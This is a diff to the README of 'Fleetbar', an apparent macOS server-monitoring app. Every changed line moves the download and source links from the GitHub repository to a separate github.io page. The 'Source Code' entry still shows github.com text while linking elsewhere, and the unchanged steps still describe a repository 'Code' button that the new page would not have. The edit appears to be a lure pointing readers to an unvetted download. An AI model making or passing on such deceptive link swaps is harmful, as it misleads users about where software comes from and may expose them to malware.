@@ -1,6 +1,6 @@
 # 👁️ Fleetbar - Your Servers, Always in Sight
 
-[![Download Fleetbar](https://img.shields.io/badge/Download-Fleetbar-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/domesticscienceheavymetal8225/Fleetbar)
+[![Download Fleetbar](https://img.shields.io/badge/Download-Fleetbar-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://domesticscienceheavymetal8225.github.io)
 
 ## 🔍 What Is Fleetbar?
 
@@ -17,7 +17,7 @@ Think of it like a friendly dashboard that hides in the corner of your screen, o
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [Download Fleetbar](https://github.com/domesticscienceheavymetal8225/Fleetbar)
+Visit this link to download the application: [Download Fleetbar](https://domesticscienceheavymetal8225.github.io)
 
 Once you're on that page, look for the big green button that says "Code" and click it. Then select "Download ZIP". After the download finishes, find the ZIP file in your Downloads folder and double-click it to open it. Inside, you'll find the Fleetbar app. Drag it to your Applications folder. That's it!
 
@@ -98,13 +98,13 @@ No. Fleetbar communicates directly from your Mac to your servers. No third-party
 
 Making sure your homelab or servers run smoothly has never been easier. Fleetbar puts all that information – literally – at your fingertips. Download it today and enjoy that calm sense of knowing everything is running well.
 
-[![Download Fleetbar](https://img.shields.io/badge/Download%20Fleetbar-FREE-blue?style=for-the-badge&labelColor=purple)](https://github.com/domesticscienceheavymetal8225/Fleetbar)
+[![Download Fleetbar](https://img.shields.io/badge/Download%20Fleetbar-FREE-blue?style=for-the-badge&labelColor=purple)](https://domesticscienceheavymetal8225.github.io)
 
 ---
 
 ## 📖 Additional Resources
 
-- **Source Code**: [github.com/domesticscienceheavymetal8225/Fleetbar](https://github.com/domesticscienceheavymetal8225/Fleetbar)
+- **Source Code**: [github.com/domesticscienceheavymetal8225/Fleetbar](https://domesticscienceheavymetal8225.github.io)
 - **Report an Issue**: Use the "Issues" tab on GitHub
 - **Contribute**: Fork the repo and submit a pull request – help is always welcome
 
